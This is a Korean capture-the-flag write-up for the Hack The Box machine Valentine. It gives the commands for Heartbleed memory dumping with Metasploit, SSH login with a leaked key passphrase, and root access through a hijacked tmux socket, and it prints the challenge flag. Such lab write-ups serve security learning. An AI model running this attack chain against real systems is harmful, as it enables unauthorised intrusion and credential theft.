# HTB — Valentine

**OS:** Linux (Ubuntu 12.04) **Difficulty:** Easy **IP:** 10.129.232.136 **Tags:** `heartbleed` `openssl` `tmux` `privesc`

---

## Summary

Valentine은 2014년에 공개된 OpenSSL Heartbleed 취약점(CVE-2014-0160)을 핵심으로 하는 머신이다. 웹 서버의 `/dev/` 디렉토리에서 암호화된 RSA 개인키를 발견하고, Heartbleed를 통해 서버 메모리에서 키 passphrase를 leak하여 SSH 접속을 달성한다. 이후 root가 남긴 tmux 소켓을 hijack하여 권한 상승한다.

---

## Reconnaissance

### Port Scan

```bash
nmap -p- --min-rate 10000 -T4 10.129.232.136
```

```
PORT    STATE SERVICE
22/tcp  open  ssh
80/tcp  open  http
443/tcp open  https
```

### Vulnerability Scan

```bash
nmap -p 22,80,443 --script vuln 10.129.232.136
```

주요 결과:

- **ssl-heartbleed**: `VULNERABLE` — CVE-2014-0160 (Risk: High)
- **http-enum**: `/dev/` 디렉토리 발견 (Apache 2.2.22)

---

## Enumeration

### /dev/ 디렉토리

```bash
curl http://10.129.232.136/dev/
```

파일 두 개 존재:

- `note.txt` — 개발 메모
- `hype_key` — hex 인코딩된 RSA 개인키

### hype_key 추출

```bash
curl http://10.129.232.136/dev/hype_key | xxd -r -p > hype_key
chmod 600 hype_key
```

키를 확인하면 passphrase로 암호화된 RSA 키임을 알 수 있다.

---

## Exploitation

### Heartbleed (CVE-2014-0160)

Metasploit으로 서버 메모리 덤프:

```bash
msfconsole
use auxiliary/scanner/ssl/openssl_heartbleed
set RHOSTS 10.129.232.136
set VERBOSE true
run
```

메모리 덤프에서 passphrase 확인:

```
heartbleedbelievethehype
```

### SSH 접속

오래된 RSA 키 알고리즘 호환을 위해 옵션 추가:

```bash
ssh -i hype_key hype@10.129.232.136 -o PubkeyAcceptedKeyTypes=+ssh-rsa
# Enter passphrase: heartbleedbelievethehype
```

---

## User Flag

```bash
cat ~/user.txt
```

```
d1185fb690ae07b9d95eb78d20fc2481
```

---

## Privilege Escalation

### tmux Session Hijacking

bash history 확인:

```bash
cat ~/.bash_history
```

```
tmux -S /.devs/dev_sess
```

소켓 파일 owner 확인:

```bash
ls -la /.devs/dev_sess
# srw-rw---- 1 root hype 0 Mar 27 19:10 /.devs/dev_sess
```

소켓 owner가 `root` — root가 실행한 tmux 세션이 살아있다.

```bash
tmux -S /.devs/dev_sess
```

root 세션에 attach되어 root shell 획득.

---

## Root Flag

```bash
cat /root/root.txt
```

---

## Attack Chain

```
Port Scan
  → 443 (HTTPS) open
    → nmap --script vuln → Heartbleed 확인
      → /dev/ 디렉토리 발견 → hype_key 획득
        → Heartbleed 메모리 덤프 → passphrase leak
          → SSH 접속 (hype)
            → bash_history → tmux 소켓 발견
              → tmux session hijack → root
```

---

## Key Takeaways

- **Heartbleed**는 SSL handshake 중 heartbeat 요청의 길이 검증 부재로 최대 64KB의 서버 메모리를 읽을 수 있다. 세션 토큰, 개인키, 패스워드 등이 노출될 수 있음.
- **tmux 소켓 hijacking**: 다른 유저가 실행한 tmux 세션의 소켓 파일에 write 권한이 있으면 해당 세션에 attach 가능. root가 실행한 세션이면 즉시 root shell.
- OpenSSL 1.0.1 ~ 1.0.1f, 1.0.2-beta 버전이 취약. 패치 버전은 1.0.1g 이상.